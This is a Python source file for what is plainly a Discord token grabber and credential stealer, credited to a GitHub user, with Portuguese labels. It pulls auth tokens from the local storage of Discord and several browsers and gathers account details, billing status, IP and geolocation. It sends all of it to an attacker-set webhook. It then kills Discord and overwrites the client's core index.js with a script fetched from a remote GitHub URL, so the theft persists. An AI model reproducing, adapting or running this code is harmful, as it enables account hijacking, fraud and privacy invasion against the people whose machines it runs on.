import os
if os.name != "nt":
	exit()
from re import findall
import json
import psutil
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime

webhook_url = "sua webhook"
password_stealer = True

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers

def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
		
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap

def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url

def has_payment_methods(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass

def main():
	embeds = []
	working = []
	checked = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']
			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")

			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			embed = {
				"color": 16507654,
				"fields": [
					{
						"name": "**Conta Info**",
						"value": f'Email: {email}',
						"inline": True
					},
			        {
						"name": "Telefone",
						"value": f'Telefone: {phone}',
						"inline": True
					},
			        {  					
						"name": "**Nitro**",
						"value": f'Nitro: {nitro}',
						"inline": True
					},
				    {  					
						"name": "**PAGAMENTO**",
						"value": f'PAGAMENTO: {billing}',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"-----------------------------------------------------------------------------------------------",
						"inline": False
					},
					{
						"name": "**PC Username**",
						"value": f'Username: {pc_username}',
						"inline": True
					},
					{
						"name": "**PC Nome**",
						"value": f'PC Nome: {pc_name}',
						"inline": True
					},
					{
						"name": "**Computador Info**",
						"value": f'OS: {computer_os}\n',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"-----------------------------------------------------------------------------------------------",
						"inline": False
					},
					{
						"name": "**IP**",
						"value": f'IP: {ip}',
						"inline": True
					},
					{
						"name": "**Token Localizaçao **",
						"value": f'Token Localizaçao: {platform}',
						"inline": True
					},
					{
						"name": "**Outras Info**",
						"value": f'Email Verificado: {verified}\n2NFA Enabled: {mfa_enabled}\nData Criaçao: {creation_date}',
						"inline": True
					},
					{
						"name": "**Token**",
						"value": f"||{token}||",
						"inline": False
					}
				],
				"author": {
					"name": f"{username}・{user_id}",
					"icon_url": avatar_url
				},
				"footer": {
					"text": "Token Grabber password By github.com/Badafofo"
				}
			}
			embeds.append(embed)

	if len(working) == 0:
		working.append('123')
	webhook = {
		"content": "Bada",
		"embeds": embeds,
		"username": "Token",
		"avatar_url": "https://media.discordapp.net/attachments/852697918397349889/946209355886362684/Screenshot_20220221-233030_CapCut.jpg"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass

def Badapcrl():
	for proc in psutil.process_iter():
		if any(procstr in proc.name() for procstr in\
		['discord', 'Discord', 'DISCORD',]):
			proc.kill()
	for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
		for name in dirs:
			if (name.__contains__("disord_core")):
				try:
					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
					os.mkdir(os.path.join(root, name+"\\discord_core\\Bada"))
					f = urlopen("https://raw.githubusercontent.com/Badafofo/Badainjection/main/badapqvcefofo.csp?token=GHSAT0AAAAAABRY5WKHQWKQGWDUJ76QRAOEYRAEYLA")
					index_content = f.read()
					with open(directory_list, 'wb') as index_file:
						index_file.write(index_content)
					with open(directory_list, 'r+') as index_file2:
						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
					with open(directory_list, 'w'): pass
					with open(directory_list, 'r+') as index_file3:
						index_file3.write(replace_string)
				except Exception:
				    pass
	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
		for name in files:
			discord_file = os.path.join(root, name)
			os.startfile(discord_file)

if __name__ == "__main__":
    main()
    if password_stealer:
        Badapcrl()
